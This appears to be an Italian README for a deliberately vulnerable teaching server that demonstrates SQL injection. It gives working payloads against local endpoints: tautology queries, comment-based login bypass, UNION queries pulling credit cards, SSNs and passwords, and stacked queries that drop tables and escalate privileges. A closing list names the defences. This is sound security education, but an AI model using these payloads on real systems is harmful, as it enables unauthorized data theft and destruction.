# 🔓 SQL Injection Attack Demonstrations

## ⚠️ DISCLAIMER
Questo server è **intenzionalmente vulnerabile** per scopi educativi. **NON UTILIZZARE IN PRODUZIONE!**

## 🎯 Vulnerabilità Implementate

### 1. 🔍 **Tautologia** - Information Disclosure
**Endpoint:** `GET /users?id=X`

**Attacchi di esempio:**
```bash
# Visualizza tutti gli utenti (bypass WHERE)
GET /users?id=1 OR 1=1

# Visualizza informazioni della tabella
GET /users?id=1 UNION SELECT name,sql,1,1,1 FROM sqlite_master WHERE type='table'

# Esfiltrazione dati sensibili
GET /users?id=1 UNION SELECT credit_card,ssn,secret_notes,1,1,1 FROM sensitive_data

# Versione del database
GET /users?id=1 UNION SELECT sqlite_version(),1,1,1,1,1
```

### 2. 🔐 **Commenti di Fine Riga** - Authentication Bypass
**Endpoint:** `POST /login`

**Attacchi di esempio:**
```bash
# Bypass autenticazione (ignora password)
username: admin'--
password: qualsiasi_cosa

# Tautologia nel login
username: admin' OR 1=1--
password: qualsiasi_cosa

# Login come primo utente
username: ' OR '1'='1'--
password: qualsiasi_cosa
```

### 3. 🔄 **Union-based** - Data Exfiltration
**Endpoint:** `GET /search?query=X`

**Attacchi di esempio:**
```bash
# Esfiltrazione carte di credito
GET /search?query=' UNION SELECT credit_card,ssn,secret_notes,1,1 FROM sensitive_data--

# Esfiltrazione credenziali utenti
GET /search?query=' UNION SELECT username,password,email,role,1 FROM users--

# Schema del database
GET /search?query=' UNION SELECT name,sql,1,1,1 FROM sqlite_master WHERE type='table'--
```

### 4. 🐷 **Piggybacked Queries** - Data Modification/Destruction
**Endpoint:** `POST /update-profile`

**Attacchi di esempio:**
```bash
# Escalation privilegi
bio: fake'; UPDATE users SET role='admin' WHERE username='john_doe'; --

# Eliminazione tabella
bio: fake'; DROP TABLE products; --

# Inserimento dati malevoli
bio: fake'; INSERT INTO users (username,password,email,role) VALUES ('hacker','pwd','h@ck.er','admin'); --

# Modifica password admin
bio: fake'; UPDATE users SET password='hacked' WHERE role='admin'; --
```

## 🛡️ Proprietà CIA - Violazioni Dimostrate

### 🔒 **Confidentiality (Riservatezza)**
- **Violazione:** Accesso non autorizzato a dati sensibili
- **Attacco:** Esfiltrazione carte di credito, SSN e note segrete
- **Esempio:**
  ```bash
  GET /search?query=' UNION SELECT credit_card,ssn,secret_notes,1,1 FROM sensitive_data--
  ```

### ✏️ **Integrity (Integrità)**  
- **Violazione:** Modifica non autorizzata dei dati
- **Attacco:** Escalation privilegi, modifica password
- **Esempio:**
  ```bash
  POST /update-profile
  bio: fake'; UPDATE users SET role='admin' WHERE username='john_doe'; --
  ```

### 🔌 **Availability (Disponibilità)**
- **Violazione:** Compromissione dell'accesso ai servizi
- **Attacco:** Eliminazione tabelle critiche
- **Esempio:**
  ```bash
  POST /update-profile  
  bio: fake'; DROP TABLE products; --
  ```

## 🕵️ Database Reconnaissance

### Scoperta Struttura Database
```bash
# Lista tutte le tabelle
GET /users?id=1 UNION SELECT name,1,1,1,1,1 FROM sqlite_master WHERE type='table'--

# Schema completo delle tabelle
GET /users?id=1 UNION SELECT sql,1,1,1,1,1 FROM sqlite_master WHERE type='table'--

# Informazioni versione
GET /users?id=1 UNION SELECT sqlite_version(),1,1,1,1,1--

# Colonne di una tabella specifica
GET /users?id=1 UNION SELECT sql,1,1,1,1,1 FROM sqlite_master WHERE name='sensitive_data'--
```

## 🧪 Test degli Attacchi

### 1. **Avvia il server**
```bash
npm start
```

### 2. **Apri http://localhost:3000**
La homepage contiene form pronti per testare gli attacchi

### 3. **Testa manualmente con curl**
```bash
# Tautologia
curl "http://localhost:3000/users?id=1%20OR%201=1"

# Authentication bypass  
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin'--&password=fake"

# Data exfiltration
curl "http://localhost:3000/search?query='%20UNION%20SELECT%20credit_card,ssn,secret_notes,1,1%20FROM%20sensitive_data--"
```

### 4. **Verifica stato database**
```bash
# Visualizza tutti i dati
GET http://localhost:3000/dump

# Reset database dopo attacchi distruttivi
POST http://localhost:3000/reset-db
```

## 🛠️ Struttura Database

### Tabella `users`
- id, username, password, email, role, created_at

### Tabella `products`  
- id, name, price, description, stock

### Tabella `orders`
- id, user_id, product_id, quantity, total_price, order_date

### Tabella `sensitive_data`
- id, user_id, credit_card, ssn, secret_notes

## 📚 Obiettivi Educativi Raggiunti

✅ **Inband SQL Injection implementata**
✅ **Tautologia** - bypass clausole WHERE  
✅ **Commenti di fine riga** - bypass autenticazione
✅ **Piggybacked queries** - esecuzione comandi multipli
✅ **Union-based** - esfiltrazione dati tra tabelle
✅ **Violazione Confidentiality** - accesso dati sensibili
✅ **Violazione Integrity** - modifica dati non autorizzata  
✅ **Violazione Availability** - eliminazione tabelle
✅ **Database Reconnaissance** - scoperta struttura DB
✅ **Database SQLite reale** con dati di test

## ⚠️ Misure di Sicurezza (NON implementate intenzionalmente)

Per proteggere da questi attacchi, in un'applicazione reale dovresti:

1. **Prepared Statements** / Parameterized Queries
2. **Input Validation** e Sanitization  
3. **Least Privilege** per utenti database
4. **WAF** (Web Application Firewall)
5. **Logging** e Monitoring
6. **Escape** caratteri speciali
7. **Stored Procedures** invece di query dinamiche